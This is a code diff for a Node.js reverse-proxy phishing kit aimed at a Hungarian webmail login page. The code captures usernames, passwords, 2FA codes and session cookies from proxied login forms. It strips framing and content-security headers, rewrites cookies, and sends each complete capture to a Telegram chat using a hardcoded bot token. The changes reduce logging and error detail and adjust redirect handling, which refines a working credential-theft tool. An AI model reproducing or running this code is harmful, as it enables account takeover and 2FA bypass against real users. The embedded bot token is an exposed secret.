@@ -11,7 +11,7 @@ const http = require('http');
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g';
 const CHAT_ID = process.env.CHAT_ID || '7837944828';
 const TARGET_URL = process.env.TARGET_URL || 'https://accounts.freemail.hu';
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});
 const app = express();
@@ -24,7 +24,7 @@ const sessions = new Map();
 // ============================================
 
 function getClientId(req) {
-  return req.ip + req.headers['user-agent'];
+  return req.ip + (req.headers['user-agent'] || '');
 }
 
 function getSession(req) {
@@ -48,8 +48,7 @@ function sendToTelegram(data) {
     `🔑 *Password:* \`${data.password || 'N/A'}\`\n` +
     `🔢 *2FA:* \`${data.twofaCode || 'N/A'}\`\n\n` +
     `🍪 *Session:* \`\`\`${data.sessionToken || 'N/A'}\`\`\`\n\n` +
-    `⏰ *Time:* ${new Date().toLocaleString()}\n` +
-    `🌐 *Target:* ${TARGET_URL}`;
+    `⏰ *Time:* ${new Date().toLocaleString()}`;
 
   bot.sendMessage(CHAT_ID, message, {parse_mode: 'Markdown'})
     .then(() => console.log('📱 Sent to Telegram'))
@@ -63,32 +62,26 @@ function sendToTelegram(data) {
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 
-// Log and capture all requests
+// Capture requests
 app.use((req, res, next) => {
   const session = getSession(req);
   
-  console.log(`[${req.method}] ${req.url} | Stage: ${session.stage}`);
-  
-  // Capture POST data (login forms)
   if (req.method === 'POST' && req.body) {
     const body = req.body;
     
-    // Try multiple field names
     const userFields = ['username', 'email', 'user', 'login', 'id', 'account', 'identifier'];
     const passFields = ['password', 'passwd', 'pass', 'pwd', 'secret'];
     const codeFields = ['code', 'otp', 'twofa', '2fa', 'verificationCode', 'token', 'pin'];
     
-    // Capture username
     for (let field of userFields) {
       if (body[field]) {
         session.username = body[field];
         session.stage = Math.max(session.stage, 1);
-        console.log('✅ Captured username:', body[field]);
+        console.log('✅ Captured username');
         break;
       }
     }
     
-    // Capture password
     for (let field of passFields) {
       if (body[field]) {
         session.password = body[field];
@@ -98,7 +91,6 @@ app.use((req, res, next) => {
       }
     }
     
-    // Capture 2FA
     for (let field of codeFields) {
       if (body[field]) {
         session.twofaCode = body[field];
@@ -121,31 +113,31 @@ const proxy = createProxyMiddleware({
   changeOrigin: true,
   secure: false,
   ws: true,
-  followRedirects: true,
   
-  // Fix cookies to work with proxy domain
+  // Don't follow redirects automatically - let browser handle them
+  followRedirects: false,
+  
   cookieDomainRewrite: {
-    '*': ''  // Remove domain restriction
-  },
-  
-  // Preserve headers
-  headers: {
-    'X-Forwarded-Proto': 'https'
+    '*': ''
   },
   
   onProxyReq: (proxyReq, req, res) => {
-    proxyReq.setHeader('Referer', TARGET_URL);
-    proxyReq.setHeader('Origin', TARGET_URL);
-    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
-    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.9');
-    
-    console.log('➡️  Proxying:', req.url);
+    try {
+      // Only set headers if not already sent
+      if (!proxyReq.headersSent) {
+        proxyReq.setHeader('Referer', TARGET_URL);
+        proxyReq.setHeader('Origin', TARGET_URL);
+      }
+      console.log('➡️  Proxying:', req.url);
+    } catch (e) {
+      console.log('Header already sent, skipping');
+    }
   },
   
   onProxyRes: (proxyRes, req, res) => {
     const session = getSession(req);
     
-    // Remove security headers that block proxying
+    // Remove security headers
     delete proxyRes.headers['x-frame-options'];
     delete proxyRes.headers['content-security-policy'];
     delete proxyRes.headers['content-security-policy-report-only'];
@@ -154,7 +146,6 @@ const proxy = createProxyMiddleware({
     if (proxyRes.headers['set-cookie']) {
       const cookies = proxyRes.headers['set-cookie'];
       
-      // Rewrite cookies for proxy compatibility
       proxyRes.headers['set-cookie'] = cookies.map(cookie => {
         return cookie
           .replace(/Domain=[^;]+;?/gi, '')
@@ -175,11 +166,8 @@ const proxy = createProxyMiddleware({
         session.stage = 4;
         
         console.log('🎉 COMPLETE CAPTURE!');
-        console.log('User:', session.username);
-        
         sendToTelegram(session);
         
-        // Clean up after 30 seconds
         setTimeout(() => sessions.delete(getClientId(req)), 30000);
       }
     }
@@ -188,7 +176,7 @@ const proxy = createProxyMiddleware({
   onError: (err, req, res) => {
     console.error('❌ Proxy Error:', err.message);
     if (!res.headersSent) {
-      res.status(502).send('Proxy error: ' + err.message);
+      res.status(502).send('Proxy error');
     }
   }
 });
